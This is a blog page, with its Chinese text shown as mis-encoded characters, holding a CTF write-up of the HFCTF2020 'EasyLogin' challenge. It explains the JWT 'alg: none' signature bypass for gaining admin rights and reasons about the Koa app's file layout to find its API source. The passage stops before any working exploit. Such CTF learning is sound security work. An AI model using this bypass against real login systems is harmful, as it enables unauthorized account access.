<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>HFCTF2020-EasyLogin - inanb</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="inanb"><meta name="msapplication-TileImage" content="img/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="inanb"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="æ‘˜è¦jwt ä¼ªé€ ï¼Œä¸€ä¸‹å†™å¥½é•¿â€¦â€¦emï¼Œåœ†æ»¡"><meta property="og:type" content="blog"><meta property="og:title" content="inanb"><meta property="og:url" content="https://removeif.github.io/"><meta property="og:site_name" content="inanb"><meta property="og:description" content="æ‘˜è¦jwt ä¼ªé€ ï¼Œä¸€ä¸‹å†™å¥½é•¿â€¦â€¦emï¼Œåœ†æ»¡"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><meta property="article:published_time" content="2021-08-18T08:29:22.741Z"><meta property="article:modified_time" content="2021-08-31T03:41:27.228Z"><meta property="article:author" content="removeif"><meta property="article:tag" content="buuctf"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/08/18/HFCTF2020-EasyLogin/"},"headline":"inanb","image":["http://example.com/images/HFCTF2020-EasyLogin/image-20210818215957097.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818220627087.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818231056478.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818232015422.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818232341328.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818234733270.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819154725607.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819154744913.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819155157713.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819155836881.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819160525000.png"],"datePublished":"2021-08-18T08:29:22.741Z","dateModified":"2021-08-31T03:41:27.228Z","author":{"@type":"Person","name":"inanb"},"description":"æ‘˜è¦jwt ä¼ªé€ ï¼Œä¸€ä¸‹å†™å¥½é•¿â€¦â€¦emï¼Œåœ†æ»¡"}</script><link rel="canonical" href="http://example.com/2021/08/18/HFCTF2020-EasyLogin/"><link rel="icon" href="/img/favicon.ico"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">é¦–é¡µ</a><a class="navbar-item" href="/archives">å½’æ¡£</a><a class="navbar-item" href="/categories">åˆ†ç±»</a><a class="navbar-item" href="/tags">æ ‡ç­¾</a><a class="navbar-item" href="/music">éŸ³è‰²</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="ç›®å½•" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="æœç´¢" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-08-18Â Â <a class="commentCountImg" href="/2021/08/18/HFCTF2020-EasyLogin/#comment-container"><span class="display-none-class">/2021/08/18/HFCTF2020-EasyLogin/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="69df56aa0e36913de91b1dbf8f3f7fda">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>19 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>2.9Â k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>æ¬¡è®¿é—®</span></div></div><h1 class="title is-3 is-size-4-mobile">HFCTF2020-EasyLogin</h1><div class="content"><blockquote>
<p>æ‘˜è¦<br>jwt ä¼ªé€ ï¼Œä¸€ä¸‹å†™å¥½é•¿â€¦â€¦emï¼Œåœ†æ»¡</p>
<a id="more"></a>
</blockquote>
<div class="toc" tabindex="1">

<!-- toc -->

<ul>
<li><a href="#%E6%8E%A2%E7%B4%A2">æ¢ç´¢</a></li>
<li><a href="#%E5%8F%8D%E6%8E%A8">åæ¨</a><ul>
<li><a href="#koa-%E6%A1%86%E6%9E%B6">koa æ¡†æ¶</a></li>
<li><a href="#controller"><strong>controller</strong>ï¼Ÿ</a><ul>
<li><a href="#mvc-%E7%9A%84-c-controller"><strong>MVC çš„ C â€“ controller</strong></a></li>
<li><a href="#rest-api"><strong>REST api</strong></a></li>
</ul>
</li>
<li><a href="#%E7%BB%8F%E9%AA%8C">ç»éªŒ</a></li>
</ul>
</li>
<li><a href="#%E4%BC%AA%E9%80%A0">ä¼ªé€ </a><ul>
<li><a href="#%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84-jwt-%E5%BA%93">æ˜“å—æ”»å‡»çš„ JWT åº“</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E4%B8%8E%E5%85%B6%E5%8E%9F%E7%90%86">ç»•è¿‡ä¸å…¶åŸç†</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div><br>

<h4><span id="æ¢ç´¢">æ¢ç´¢</span></h4><p>æœ‰/login /register /home é¡µé¢</p>
<p>åœ¨/homeé¡µé¢getflagï¼Œæç¤º<strong>permission denied</strong> ï¼Œä¼°è®¡æ˜¯è¦adminæƒé™ï¼Œadminè´¦å·æ— æ³•æ³¨å†Œ</p>
<p><strong>å¼•å…¥çš„ jsï¼š</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.getItem(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.post(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">                <span class="built_in">document</span>.location = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    $.post(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/logout&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/flag&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).val(flag);</span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…çš„æ—¶å€™å‘ç°å¾ˆå¥‡æ€ªï¼Œä¼¼ä¹å¹¶æ²¡æœ‰è´¦æˆ·æ•°æ®ã€‚æ³¨å†Œæ—¶ä¼šç»™ä¸€ä¸ªæˆæƒ(<strong>authorization</strong>)ï¼Œbase64è§£ä¸€ä¸‹å‘ç°æ˜¯ <strong>jwt</strong>ï¼Œæ•´ä¸ªç™»å½•æµç¨‹å…¨é jwtçš„éªŒè¯ï¼Œæ‰€ä»¥éœ€è¦å¯¹jwtæœ‰æ‰€äº†è§£ã€‚</p>
<img src="/images/HFCTF2020-EasyLogin/image-20210818215957097.png" alt="image-20210818215957097" style="zoom:80%;">

<p><img src="/images/HFCTF2020-EasyLogin/image-20210818220627087.png" alt="image-20210818220627087"></p>
<blockquote>
<p>ç™»é™†æˆåŠŸåä¼šè¿”å›ä¸€ä¸ªbase64åŠ å¯†åçš„ç”¨æˆ·æ•°æ®å’Œä¸€ä¸ªç­¾å</p>
</blockquote>
<blockquote>
<p>1ã€å‰åç«¯åˆ†ç¦»ï¼Œå³æœåŠ¡ç«¯å’Œå‰ç«¯åªå…³å¿ƒè‡ªå·±çš„äº‹ã€‚</p>
<p>2ã€ä½¿ç”¨ <strong>jwt</strong> ä½œä¸º <strong>api</strong> è®¤è¯å‡­è¯</p>
<p>3ã€æœåŠ¡ç«¯ä»…ä¿å­˜åŠ å¯†ç”¨çš„<strong>secret</strong></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">æ·±å…¥äº†è§£Json Web Tokenä¹‹å®æˆ˜ç¯‡ </a></p>
<p><strong>å°†åŠ å¯†æ–¹å¼æ”¹ä¸ºâ€™noneâ€™</strong></p>
<p>ä¸‹æ–‡å®æˆ˜ä¸­çš„ Juice Shop JWT issue 1 ä¾¿æ˜¯è¿™ä¸ªé—®é¢˜ã€‚ä¹‹å‰è°ˆåŠè¿‡nonsecure JWTçš„é—®é¢˜ã€‚</p>
<p>ç­¾åç®—æ³•ç¡®ä¿æ¶æ„ç”¨æˆ·åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šä¿®æ”¹JWTã€‚ä½†æ˜¯æ ‡é¢˜ä¸­çš„algå­—æ®µå¯ä»¥æ›´æ”¹ä¸ºnoneã€‚ä¸€äº›JWTåº“æ”¯æŒæ— ç®—æ³•ï¼Œå³æ²¡æœ‰ç­¾åç®—æ³•ã€‚å½“algä¸ºnoneæ—¶ï¼Œåç«¯å°†ä¸æ‰§è¡Œç­¾åéªŒè¯ã€‚å°†algæ›´æ”¹ä¸ºnoneåï¼Œä»JWTä¸­åˆ é™¤ç­¾åæ•°æ®ï¼ˆä»…æ ‡é¢˜+â€™.â€™+ payload +â€™.â€™ï¼‰å¹¶å°†å…¶æäº¤ç»™æœåŠ¡å™¨ã€‚</p>
</blockquote>
<p>æ­¤æ—¶æˆ‘ä»¬çŸ¥é“ï¼Œå¯ä»¥æ›´æ”¹åŠ å¯†æ–¹æ³•ï¼Œä¸ç”Ÿæˆç­¾åï¼Œç»•è¿‡ç­¾åéªŒè¯</p>
<p>ä½†è¿‡ä¸å»ï¼Œæˆ‘ä»¬è¿˜éœ€è¦çœ‹ä¸€ä¸ªä¸œè¥¿</p>
<h4><span id="åæ¨">åæ¨</span></h4><p>è§£é¢˜æˆ‘ä»¬è¿˜éœ€è¦çœ‹ <strong>/controllers/api.js</strong> è¿™ä¹ˆä¸ªç©æ„â€¦â€¦è¿™ä¹Ÿæ‰«ä¸å‡ºæ¥å•Šâ€¦â€¦</p>
<p>ä½œä¸ºä¸€ä¸ªå•¥ä¹Ÿä¸æ‡‚çš„èœé¸¡ï¼Œå¦‚æœä»ä¸€ä¸ªå¼€å‘è€…çš„è§’åº¦å»æ€è€ƒâ€¦â€¦</p>
<blockquote>
<p>ä»¥ä¸‹æ˜¯ä¸ªäººç†è§£â€¦â€¦</p>
</blockquote>
<h5><span id="koa-æ¡†æ¶">koa æ¡†æ¶</span></h5><blockquote>
<p>/**</p>
<ul>
<li><p>æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</p>
</li>
<li><p>è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</p>
<p>  */</p>
</li>
</ul>
</blockquote>
<p>åœ¨å¼•å…¥çš„jsä¸­ï¼Œå¯ä»¥çœ‹åˆ° <strong>koa-static</strong>ï¼ŒæŸ¥çœ‹ä¸‹koaçš„æ¡†æ¶ç»“æ„ï¼š</p>
<ol>
<li>ä¸åŒ…å« <strong>controller</strong></li>
</ol>
<p><a target="_blank" rel="noopener" href="https://segmentfault.com/q/1010000021297024">koaæ˜¯å¦æœ‰å¿…è¦å®ç°controllersï¼Ÿ å¦‚ä½•å®ç°ï¼Ÿ</a></p>
<ol start="2">
<li>åŒ…å« <strong>controller</strong></li>
</ol>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_36554693/article/details/105683996">Koaå…¥é—¨ï¼ˆä¸€ï¼‰â€”â€” Koaé¡¹ç›®åŸºç¡€æ¡†æ¶æ­å»º</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33894640/article/details/91459845">ä¸€æ­¥ä¸€æ­¥æ•™ä½ å®ŒæˆKoa2æ¥å£å¼€å‘</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43702430/article/details/103456209">koaåç«¯æ¨¡æ¿</a></p>
<ol start="3">
<li>åŒ…å« <strong>controller</strong> çš„ <strong>MVC</strong> æ¶æ„</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/47259f48c153">ä»é›¶å¼€å§‹æ­å»ºkoaåå°åŸºç¡€æ¡†æ¶</a>    <em>ï¼ˆè¿™ä¸ªå…¶å®ä¸æ˜¯å¾ˆåˆé€‚  :D</em></p>
<h5><span id="controller"><strong>controller</strong>ï¼Ÿ</span></h5><p>ç”±æ­¤å¯è§ koa æ¡†æ¶å¹¶æ²¡æœ‰è§„å®šcontrollerçš„å­˜åœ¨ï¼Œè€Œcontrolleråœ¨<strong>ä¸åŒè¯­å¢ƒ</strong>ä¸‹æœ‰ç€ä¸åŒçš„ä½œç”¨</p>
<h6><span id="mvc-çš„-c-controller"><strong>MVC çš„ C â€“ controller</strong></span></h6><blockquote>
<p><em><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ghxb/p/8427462.html">MVC äºä¸‰å±‚æ¶æ„æœ€å¤§çš„åŒºåˆ«</a></em></p>
<p><em><a target="_blank" rel="noopener" href="https://blog.csdn.net/csh624366188/article/details/7183872">mvcä¸ä¸‰å±‚ç»“æ„ç»ˆæåŒºåˆ«</a></em></p>
<p>è¶æœºå¤ä¹ ä¸‹å¼€å‘æ—¶å­¦åˆ°æ¶æ„çŸ¥è¯†ğŸ˜‹</p>
</blockquote>
<img src="/images/HFCTF2020-EasyLogin/image-20210818231056478.png" alt="image-20210818231056478" style="zoom:67%;">

<p>ä¸Šå›¾æ˜æ˜¾çš„æ ‡å‡ºï¼Œjavawebä¸­servletçš„ä½œç”¨æ­£æ˜¯ <strong>controller</strong></p>
<p><img src="/images/HFCTF2020-EasyLogin/image-20210818232015422.png" alt="image-20210818232015422"></p>
<p><strong>servlet</strong> ä½œä¸º <strong>jsp</strong> ä¸ <strong>Model</strong> æ•°æ®äº¤æ¢çš„å¹³å°ï¼Œä¸Šæ¥ <strong>jsp</strong>ï¼Œä¸‹æ¥ **service **ï¼ŒæŒ‰ç†æ¥è¯´æ˜¯è¿™æ ·</p>
<img src="/images/HFCTF2020-EasyLogin/image-20210818232341328.png" alt="image-20210818232341328" style="zoom:89%;">

<blockquote>
<p>è¿™å›¾ä¸æ˜¯å¾ˆåˆé€‚â€¦â€¦</p>
</blockquote>
<p>è®¿é—®ä¸åŒçš„servletï¼Œä¼šä½¿ç”¨ä¸åŒçš„**ä¸šåŠ¡é€»è¾‘(service)**ï¼Œä¸šåŠ¡é€»è¾‘åˆ™æ ¹æ®åŸå­åŒ–çš„æ•°æ®è®¿é—®å±‚æŒ‡å‘ç¬¦åˆéœ€æ±‚çš„æ•°æ®æ“ä½œ</p>
<p>å¦‚æœå†æ¬¡ç»†åŒ–ï¼Œä»¥ä¾¿é¢å‘éœ€æ±‚çµæ´»çš„è°ƒæ•´ï¼Œæˆ–è€…<strong>å‰åç«¯åˆ†ç¦»</strong>ã€åˆä½œï¼Œåˆå‡ºç°äº† <strong>routes(è·¯ç”±)**ï¼Œè·¯ç”±å¯ä»¥è´Ÿè´£åˆ†å‘ä¸åŒçš„è¯·æ±‚ï¼Œå¤„ç†</strong>å‰ç«¯**ã€‚</p>
<p>è€ŒåŸºäºè·¯ç”±çš„åˆ†å‘ï¼Œ<strong>æ¥å£(api)**ï¼Œä½œä¸ºè¯·æ±‚</strong>åç«¯**æ•°æ®çš„åœ°å€ä¸æ–¹å¼ä¹Ÿå‡ºç°äº†ã€‚</p>
<p>ä½†æ€ä¹ˆå†™å‘¢ï¼Ÿä¸Šé¢çš„ä¾‹å­ä¸­ä¹Ÿæœ‰äººæŠŠcontrollerå†™åˆ°routeä¸­å»â€¦â€¦</p>
<blockquote>
<p>è™½ç„¶é¢˜ç›®è¯´éƒ½æ”¾æ ¹ç›®å½•â€¦â€¦</p>
</blockquote>
<h6><span id="rest-api"><strong>REST api</strong></span></h6><blockquote>
<p>*<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/75389ea9a90b">rest apiä»‹ç»</a>*ï¼šrest api æ˜¯å‰åç«¯åˆ†ç¦»æœ€ä½³å®è·µï¼Œæ˜¯å¼€å‘çš„ä¸€å¥—æ ‡å‡†æˆ–è€…è¯´æ˜¯ä¸€å¥—è§„èŒƒï¼Œä¸æ˜¯æ¡†æ¶ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯RESTå‘¢?</strong></p>
<p>RESTæ˜¯Representational State Transferï¼ˆè¡¨ç°å±‚çŠ¶æ€è½¬ç§»ï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯ç”±ç½—ä¼ŠÂ·è²å°”ä¸ï¼ˆRoy Fieldingï¼‰æå‡ºçš„ï¼Œæ˜¯ç”¨æ¥æè¿°åˆ›å»ºHTTP APIçš„æ ‡å‡†æ–¹æ³•çš„ï¼Œä»–å‘ç°è¿™å››ç§å¸¸ç”¨çš„è¡Œä¸ºï¼ˆæŸ¥çœ‹ï¼ˆviewï¼‰ï¼Œåˆ›å»ºï¼ˆcreateï¼‰ï¼Œç¼–è¾‘ï¼ˆeditï¼‰å’Œåˆ é™¤ï¼ˆdeleteï¼‰ï¼‰éƒ½å¯ä»¥ç›´æ¥æ˜ å°„åˆ°HTTP ä¸­å·²å®ç°çš„GET,POST,PUTå’ŒDELETEæ–¹æ³•ã€‚</p>
<p>â€”â€” <em><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42611547/article/details/84346809">ä»€ä¹ˆæ˜¯REST API</a></em></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/28557115">æ€æ ·ç”¨é€šä¿—çš„è¯­è¨€è§£é‡ŠRESTï¼Œä»¥åŠRESTfulï¼Ÿ</a></p>
</blockquote>
<p><strong>å®é™…ä¸Šï¼Œæ¥å£å¼€å‘çš„rest apiè§„èŒƒååˆ†æ¥è¿‘ç­”æ¡ˆ</strong></p>
<blockquote>
<p><strong>å¼€å‘REST API</strong></p>
<p>rest-hello å·¥ç¨‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">rest-koa&#x2F;</span><br><span class="line">|</span><br><span class="line">+- .vscode&#x2F;</span><br><span class="line">|  |</span><br><span class="line">|  +- launch.json &lt;-- VSCode é…ç½®æ–‡ä»¶</span><br><span class="line">|</span><br><span class="line">+- controllers&#x2F;</span><br><span class="line">|  |</span><br><span class="line">|  +- api.js &lt;-- REST API</span><br><span class="line">|  |</span><br><span class="line">|  +- index.js &lt;-- MVC Controllers</span><br><span class="line">|</span><br><span class="line">+- products.js &lt;-- é›†ä¸­å¤„ç†Product</span><br><span class="line">|</span><br><span class="line">+- rest.js &lt;-- æ”¯æŒRESTçš„middleware</span><br><span class="line">|</span><br><span class="line">+- app.js &lt;-- ä½¿ç”¨koaçš„js</span><br><span class="line">|</span><br><span class="line">+- controller.js &lt;-- æ‰«ææ³¨å†ŒController</span><br><span class="line">|</span><br><span class="line">+- static-files.js &lt;-- æ”¯æŒé™æ€æ–‡ä»¶çš„middleware</span><br><span class="line">|</span><br><span class="line">+- templating.js &lt;-- æ”¯æŒNunjucksçš„middleware</span><br><span class="line">|</span><br><span class="line">+- package.json &lt;-- é¡¹ç›®æè¿°æ–‡ä»¶</span><br><span class="line">|</span><br><span class="line">+- views&#x2F; &lt;-- Nunjucksæ¨¡æ¿</span><br><span class="line">|</span><br><span class="line">+- static&#x2F; &lt;-- é™æ€èµ„æºæ–‡ä»¶</span><br><span class="line">|</span><br><span class="line">+- node_modules&#x2F; &lt;-- npmå®‰è£…çš„æ‰€æœ‰ä¾èµ–åŒ…</span><br></pre></td></tr></table></figure>

<p><em>â€”â€”<a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1022910821149312/1105009634703392">å¼€å‘REST API</a></em></p>
<img src="/images/HFCTF2020-EasyLogin/image-20210818234733270.png" alt="image-20210818234733270" style="zoom:67%;">

<p><em>â€”â€”<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33894640/article/details/91459845">ä¸€æ­¥ä¸€æ­¥æ•™ä½ å®ŒæˆKoa2æ¥å£å¼€å‘I</a></em></p>
</blockquote>
<p>éšç€å·¥ç¨‹çš„å¢åŠ åŠå·¥ç¨‹äººå‘˜çš„å¢å¤šã€éœ€æ±‚çš„å¢å¤šï¼Œæˆ‘ä»¬éœ€è¦åˆç†çš„è§„èŒƒæ¥ä¿è¯ä»£ç çš„ç®¡ç†æ•ˆç‡ä¸èŠ±è´¹ã€‚è¿™äº›ç»“æ„ä¸Šçš„ç»†åŒ–ä¾¿éšä¹‹åŠ æ·±ã€‚</p>
<blockquote>
<p>çœ‹ç€æ„Ÿè§‰ååˆ†æ²³é‡Œå•Šâ€¦â€¦è¿™éƒ½æ˜¯ç»éªŒå•Š~</p>
</blockquote>
<h5><span id="ç»éªŒ">ç»éªŒ</span></h5><p>æœ‰äº†ä»¥ä¸ŠçŸ¥è¯†ä½œä¸ºé“ºå«ï¼Œå†çœ‹å¼•å…¥çš„ app.js ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œè¿™ä¼¼ä¹æ˜¯é€šè¿‡apié€šä¿¡çš„â€¦â€¦</p>
<p>é¡ºç†æˆç« åœ°ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è¯»å–apiçš„é€»è¾‘ï¼Œåº”è¯¥å°±å¯ä»¥æˆåŠŸä¼ªé€ jwtäº†ï¼ </p>
<blockquote>
<p>éš¾ç‚¹ä¹Ÿå°±åœ¨äºæ­¤äº†å§â€¦â€¦</p>
<p>å³ä½¿ç”¨koa-staticæ‰˜ç®¡é™æ€èµ„æºï¼Œæ¥å£ä¹Ÿæœ‰å¯èƒ½è¢«çˆ¬åˆ°å§â€¦â€¦åªæœ‰æ··æ·†æˆ–åŠ å¯†ï¼Ÿ</p>
<p>ä¸å¤ªæ‡‚æ¬¸â€¦â€¦</p>
</blockquote>
